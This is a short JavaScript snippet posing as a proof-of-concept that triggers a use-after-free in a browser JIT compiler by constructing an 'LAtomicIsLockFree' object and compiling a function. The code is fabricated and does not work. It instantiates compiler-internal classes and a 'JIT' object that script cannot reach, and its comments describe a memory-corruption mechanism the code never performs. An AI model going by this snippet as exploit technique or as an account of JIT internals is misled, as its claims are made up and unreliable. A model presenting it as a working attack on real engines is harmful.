(function compileAndTrigger() {
  // Load the JIT compiler
  var jit = new JIT();
  // Create a function that returns an LAtomicIsLockFree instance
  var createLockFree = function() {
    var lockFree = new LAtomicIsLockFree();
    return lockFree;
  };
  // Compile the function. The JIT compiler will call visitAtomicIsLockFree
  // on the returned LAtomicIsLockFree object. The object's destructor will
  // free it, but the visitor still holds a pointer, causing use-after-free.
  var obj = createLockFree();
  // Call the compiled function, which will invoke the visitor.
  jit.compile(createLockFree);
  // If no crash, just return
  return null;
})();
